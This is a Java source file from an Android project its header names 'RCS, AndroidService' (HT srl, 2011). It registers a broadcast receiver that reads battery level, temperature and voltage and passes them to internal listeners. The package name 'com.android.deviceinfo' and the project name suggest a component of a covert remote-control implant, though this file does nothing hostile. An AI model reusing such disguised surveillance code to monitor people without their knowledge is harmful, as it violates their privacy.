/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ListenerBattery.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.listener;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;

import com.android.deviceinfo.Battery;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;

public class ListenerBattery extends Listener<Battery> {
	/** The Constant TAG. */
	private static final String TAG = "ListenerBattery"; //$NON-NLS-1$

	private BroadcastReceiver batteryReceiver;

	/** The singleton. */
	private volatile static ListenerBattery singleton;

	/**
	 * Self.
	 * 
	 * @return the status
	 */
	public static ListenerBattery self() {
		if (singleton == null) {
			synchronized (ListenerBattery.class) {
				if (singleton == null) {
					singleton = new ListenerBattery();
				}
			}
		}

		return singleton;
	}

	@Override
	protected void start() {
		batteryReceiver = new BroadcastReceiver() {
			int scale = -1;
			int level = -1;
			int voltage = -1;
			int temp = -1;

			@Override
			public void onReceive(final Context context, final Intent intent) {
				level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
				temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
				voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);

				if (Cfg.DEBUG) {
					Check.log(TAG + " BatteryManager level is " + level + "/" + scale + ", temp is " + temp //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ ", voltage is " + voltage); //$NON-NLS-1$
				}

				// Call batteryMonitor() in Status ever time we have a change of
				// status
				dispatch(new Battery(level, scale, temp, voltage));
			}
		};

		final IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);

		// Register the broadcastreceiver and filter it to only get battery
		// status changes
		Status.getAppContext().registerReceiver(batteryReceiver, filter);

	}

	@Override
	protected void stop() {
		Status.getAppContext().unregisterReceiver(batteryReceiver);
	}
}
